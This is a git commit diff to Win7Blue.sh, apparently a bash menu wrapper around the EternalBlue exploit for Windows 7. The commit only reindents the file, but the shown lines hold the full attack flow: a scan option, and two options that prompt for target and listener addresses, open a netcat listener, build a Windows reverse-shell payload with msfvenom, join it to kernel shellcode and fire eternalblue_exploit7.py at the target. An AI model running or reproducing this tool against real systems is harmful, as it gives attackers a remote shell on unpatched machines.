90c1b8c517d295dab5451cb9224449331f878de9
Miguel R <d4t4s3c@protonmail.com>
2020-04-26 23:04:17 +0200

    Update Win7Blue.sh

--- Win7Blue.sh
+++ Win7Blue.sh
@@ -43,7 +43,7 @@ function checkroot(){
 	    sleep 4
 	    echo ""
     else
-        echo ""
+            echo ""
 	    echo -e " $b[$r$no$b] root $nc"
 	    sleep 4
 	    echo ""
@@ -55,139 +55,138 @@ function checkroot(){
 }
 
 function banner(){
-        echo ""
-        echo -e "$b┌═══════════════════════════════════┐"
-        echo -e "$b║$az  ██╗    ██╗██╗███╗   ██╗███████╗  $b║"
-        echo -e "$b║$az  ██║    ██║██║████╗  ██║╚════██║  $b║" 
-        echo -e "$b║$az  ██║ █╗ ██║██║██╔██╗ ██║    ██╔╝  $b║" 
-        echo -e "$b║$az  ██║███╗██║██║██║╚██╗██║   ██╔╝   $b║"  
-        echo -e "$b║$az  ╚███╔███╔╝██║██║ ╚████║   ██║    $b║"
-        echo -e "$b║$az   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝   ╚═╝    $b║"   
-        echo -e "$b║$az ██████╗ ██╗     ██╗   ██╗███████╗ $b║"
-        echo -e "$b║$az ██╔══██╗██║     ██║   ██║██╔════╝ $b║"
-        echo -e "$b║$az ██████╔╝██║     ██║   ██║█████╗   $b║"  
-        echo -e "$b║$az ██╔══██╗██║     ██║   ██║██╔══╝   $b║" 
-        echo -e "$b║$az ██████╔╝███████╗╚██████╔╝███████╗ $b║"
-        echo -e "$b║$az ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝ $b║"
-        echo -e "$b║$r  Author $b:$a d4t4s3c                 $b║"
-        echo -e "$b║$r  Email  $b:$a d4t4s3c@protonmail.com  $b║"
-        echo -e "$b║$r  GitHub $b:$a www.github.com/d4t4s3c  $b║"
-        echo -e "$b└═══════════════════════════════════┘$b"
+           echo ""
+           echo -e "$b┌═══════════════════════════════════┐"
+           echo -e "$b║$az  ██╗    ██╗██╗███╗   ██╗███████╗  $b║"
+           echo -e "$b║$az  ██║    ██║██║████╗  ██║╚════██║  $b║" 
+           echo -e "$b║$az  ██║ █╗ ██║██║██╔██╗ ██║    ██╔╝  $b║" 
+           echo -e "$b║$az  ██║███╗██║██║██║╚██╗██║   ██╔╝   $b║"  
+           echo -e "$b║$az  ╚███╔███╔╝██║██║ ╚████║   ██║    $b║"
+           echo -e "$b║$az   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝   ╚═╝    $b║"   
+           echo -e "$b║$az ██████╗ ██╗     ██╗   ██╗███████╗ $b║"
+           echo -e "$b║$az ██╔══██╗██║     ██║   ██║██╔════╝ $b║"
+           echo -e "$b║$az ██████╔╝██║     ██║   ██║█████╗   $b║"  
+           echo -e "$b║$az ██╔══██╗██║     ██║   ██║██╔══╝   $b║" 
+           echo -e "$b║$az ██████╔╝███████╗╚██████╔╝███████╗ $b║"
+           echo -e "$b║$az ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝ $b║"
+           echo -e "$b║$r  Author $b:$a d4t4s3c                 $b║"
+           echo -e "$b║$r  Email  $b:$a d4t4s3c@protonmail.com  $b║"
+           echo -e "$b║$r  GitHub $b:$a www.github.com/d4t4s3c  $b║"
+           echo -e "$b└═══════════════════════════════════┘$b"
 }
 
 function main(){
-	    echo ""
-        echo -e "$b[$az$n1$b] Scan $nc"
-        echo -e "$b[$az$n2$b] Exploit Windows 7 $az$k1 $nc"
-        echo -e "$b[$az$n3$b] Exploit Windows 7 $az$k2 $nc"                
-        echo -e "$b[$az$n4$b] Exit"
-        echo ""
+	   echo ""
+           echo -e "$b[$az$n1$b] Scan $nc"
+           echo -e "$b[$az$n2$b] Exploit Windows 7 $az$k1 $nc"
+           echo -e "$b[$az$n3$b] Exploit Windows 7 $az$k2 $nc"                
+           echo -e "$b[$az$n4$b] Exit"
+           echo ""
 }
-
 
 function menu(){
 
 read -p " $(echo -e $az$shell $nc)" opc
 
     if [ $opc -eq 1 ]; then
-   	        echo ""
-	        echo -e "$b$rh$nc"
-	        echo ""
-	        read rhost
-	        echo ""
-	        echo -e "$b$x $az$rhost $nc"
-	        echo ""
-	        sleep 2
-            python eternalblue_scanner.py $rhost
-            echo ""
-            echo -e "$b$c$nc"
-            sleep 4
-            banner
-            main
-            menu
+   	   echo ""
+	   echo -e "$b$rh$nc"
+	   echo ""
+	   read rhost
+	   echo ""
+	   echo -e "$b$x $az$rhost $nc"
+	   echo ""
+	   sleep 2
+           python eternalblue_scanner.py $rhost
+           echo ""
+           echo -e "$b$c$nc"
+           sleep 4
+           banner
+           main
+           menu
     elif [ $opc -eq 2 ]; then
-	        echo ""
-	        echo -e "$b$rh$nc"
-	        echo ""
-	        read rhost
-	        echo ""
-	        echo -e "$b$lh$nc"
-	        echo ""
-	        read lhost
-	        echo ""
-	        echo -e "$b$lp$nc"
-	        echo ""
-	        read lport
-	        echo ""
-	        rm -rf sc_x86_msf.bin
-	        rm -rf sc_x86.bin
-	        echo -e "$b$netcat$nc"
-	        echo ""
-	        sleep 2
-	        xterm -hold -e "rlwrap nc -lvnp $lport" &
-	        echo -e "$b$msf$nc"
-	        echo ""
-	        sleep 2
-	        msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
-	        sleep 1
-            cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
-            sleep 1
-            python eternalblue_exploit7.py $rhost sc_x86.bin
-	        exit
+	   echo ""
+	   echo -e "$b$rh$nc"
+	   echo ""
+	   read rhost
+	   echo ""
+	   echo -e "$b$lh$nc"
+	   echo ""
+	   read lhost
+	   echo ""
+	   echo -e "$b$lp$nc"
+	   echo ""
+	   read lport
+	   echo ""
+	   rm -rf sc_x86_msf.bin
+	   rm -rf sc_x86.bin
+	   echo -e "$b$netcat$nc"
+	   echo ""
+	   sleep 2
+	   xterm -hold -e "rlwrap nc -lvnp $lport" &
+	   echo -e "$b$msf$nc"
+	   echo ""
+	   sleep 2
+	   msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
+	   sleep 1
+           cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
+           sleep 1
+           python eternalblue_exploit7.py $rhost sc_x86.bin
+	   exit
     elif [ $opc -eq 3 ]; then
-            echo ""
-	        echo -e "$b$rh$nc"
-	        echo ""
-	        read rhost
-	        echo ""
-	        echo -e "$b$lh$nc"
-	        echo ""
-	        read lhost
-	        echo ""
-	        echo -e "$b$lp$nc"
-	        echo ""
-	        read lport
-	        echo ""
-	        rm -rf sc_x64_msf.bin
-	        rm -rf sc_x64.bin
-	        echo -e "$b$netcat$nc"
-	        echo ""
-	        sleep 2
-	        xterm -hold -e "rlwrap nc -lvnp $lport" &
-	        echo -e "$b$msf$nc"
-	        echo ""
-	        sleep 2
-	        msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
-	        sleep 1
-            cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
-            sleep 1
-            python eternalblue_exploit7.py $rhost sc_x64.bin
+           echo ""
+	   echo -e "$b$rh$nc"
+	   echo ""
+	   read rhost
+	   echo ""
+	   echo -e "$b$lh$nc"
+	   echo ""
+	   read lhost
+	   echo ""
+	   echo -e "$b$lp$nc"
+	   echo ""
+	   read lport
+	   echo ""
+	   rm -rf sc_x64_msf.bin
+	   rm -rf sc_x64.bin
+	   echo -e "$b$netcat$nc"
+	   echo ""
+	   sleep 2
+	   xterm -hold -e "rlwrap nc -lvnp $lport" &
+	   echo -e "$b$msf$nc"
+	   echo ""
+	   sleep 2
+	   msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
+	   sleep 1
+           cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
+           sleep 1
+           python eternalblue_exploit7.py $rhost sc_x64.bin
 	        exit
     elif [ $opc -eq 4 ]; then
-	        echo ""
-	        echo ""
-	        echo -e "$a        |\/\/\/|"
-            echo -e "        |      |" 
-            echo -e "        |      |" 
-            echo -e "        | (o)(o) " 
-            echo -e "        C      _) "
-            echo -e "         | ,___|  "
-            echo -e "         |   /    "
-            echo -e "        /____\ "
-            echo -e "       /      \ $nc"
-            echo -e "$b#### $v BYE $v HACKER $b ####$nc"
-            echo ""
-            echo ""
-	        sleep 3
-	        exit
+	   echo ""
+	   echo ""
+	   echo -e "$a        |\/\/\/|"
+           echo -e "        |      |" 
+           echo -e "        |      |" 
+           echo -e "        | (o)(o) " 
+           echo -e "        C      _) "
+           echo -e "         | ,___|  "
+           echo -e "         |   /    "
+           echo -e "        /____\ "
+           echo -e "       /      \ $nc"
+           echo -e "$b#### $v BYE $v HACKER $b ####$nc"
+           echo ""
+           echo ""
+	   sleep 3
+	   exit
     else
-	        echo ""
-	        echo -e "$b$in$nc"
-	        echo ""
-	        sleep 2
-	        banner
-	        main
-	        menu
+	   echo ""
+	   echo -e "$b$in$nc"
+	   echo ""
+	   sleep 2
+	   banner
+	   main
+	   menu
     fi
 }
 
